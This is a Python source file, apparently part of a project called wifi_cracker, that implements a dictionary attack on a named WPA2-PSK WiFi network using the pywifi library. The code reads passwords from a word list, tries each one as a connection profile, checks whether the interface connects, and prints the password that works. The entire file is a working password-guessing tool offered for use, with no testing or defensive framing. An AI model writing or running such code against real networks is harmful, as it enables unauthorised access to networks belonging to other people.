# src/wifi_cracker/core/wifi_key_authentication.py

# Standard library
import sys
import time

# Third-party
import pywifi
from pywifi import const


# classes
class WifiCracker:
    def crack_dictionary_attack(ssid_text: str, text_file_path: str):
        try:
            ssid = ssid_text
            var_time = 0.1
        except ValueError:
            print("Error: Cycle time must be an integer.")  # This should link to a dialog window.
            sys.exit(1) 
        
        if not ssid or var_time <= 0:
            print("Error: Please enter a valid SSID and cycle time grater than 0.")  # This should link to a dialog window.
            sys.exit(1) 
            
        # WiFi cracking logic
        try:
            dictionary_path = text_file_path
            
            with open(dictionary_path, "r", errors="ignore") as file:
                # Initialize pywifi
                try:
                    wifi = pywifi.PyWiFi()
                    iface = wifi.interfaces()[0]
                    iface.disconnect()
                    print(f"\nStarting dictionary attack on network: {ssid}\n")
                except Exception as e:
                    print(f"Interface Error: Failed to initialize WiFi interface. Run as admin {e}")  # This should link to a dialog window.
                
                # Iterate through each password
                for line in file:
                    password = line.strip()
                    
                    # Shows the password that is currently being tested
                    print(f"Testing: {password.ljust(30)}", end="\r")  # This should link to a dialog window.
                    
                    profile = pywifi.Profile()
                    profile.ssid = ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    
                    # Attempt to connect
                    iface.remove_all_network_profiles()
                    tmp_profile = iface.add_network_profile(profile)
                    iface.connect(tmp_profile)
                    
                    # Wait for connection
                    time.sleep(var_time)
                    
                    # Check status
                    if iface.status() == const.IFACE_CONNECTED:
                        print("\n" + "="*50)
                        print(f"SUCCESS: Connected to network: {ssid}")
                        print(f"The password is: {password}")
                        print("="*50)
                        return  # Exit function on success
            
            print("\nDictionary exhausted. Password not found.")
            
        except FileNotFoundError:
            print("\nFatal Error: 'dictionary.txt' file not found in script directory.") # The dictionary file name should be an f-string and display name of actual .txt file.
        except Exception as e:
            print("\nError: Could not connect to network.")